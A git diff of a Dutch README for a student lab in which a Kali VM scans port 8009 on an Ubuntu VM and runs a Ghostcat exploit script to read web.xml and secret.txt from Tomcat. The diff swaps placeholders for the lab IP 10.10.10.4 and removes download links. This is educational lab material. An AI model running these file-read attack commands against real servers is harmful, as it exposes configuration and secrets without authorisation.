@@ -100,9 +100,9 @@ Nu we een correcte virtuele omgeving hebben in beide VM's kunnen we beginnen aan
 - 4.4) sudo systemctl enable ssh
 - 4.5) cd Downloads
 - 4.6) chmod +x exploit_ghostcat.py
-- 4.7) nmap [ip adres van de ubuntu vm] -p 8009
-- 4.8) python3 exploit_ghostcat.py http://[ip adres van de ubuntu vm]:8080/ 8009 /WEB-INF/web.xml read
-- 4.9) python3 exploit_ghostcat.py http://[ip adres van de ubuntu vm]:8080/ 8009 /WEB-INF/secret.txt read
+- 4.7) nmap 10.10.10.4 -p 8009
+- 4.8) python3 exploit_ghostcat.py http://10.10.10.4:8080/ 8009 /WEB-INF/web.xml read
+- 4.9) python3 exploit_ghostcat.py http://10.10.10.4:8080/ 8009 /WEB-INF/secret.txt read
 
 ## Installatie-instructies: Stap-voor-stap instructies voor het installeren van de software. Waar de bestanden te vinden zijn (bijv. downloadlink, locatie van installatiebestanden). Vereiste rechten voor installatie (bijv. beheerdersrechten)
 
@@ -110,8 +110,7 @@ Installaties van de benodigde software kan je hieronder telkens vinden:
 
 - Oracle Virtual Box: <https://www.virtualbox.org/wiki/Downloads>
 - SSH: .......... <!-- hoe ?-->
-- Optioneel: Ubuntu 24.10 64bit vdi: <https://www.osboxes.org/ubuntu/>
-- Optioneel: Kali Linux 2024.3 64bit vdi: <https://www.osboxes.org/kali-linux/>
+
 
 ## Configuratie-instellingen: Configuratie-instellingen die mogelijk moeten worden aangepast om de software goed te laten functioneren. Aanpassingen aan netwerkconfiguraties, databases, services, of beveiligingsinstellingen
 
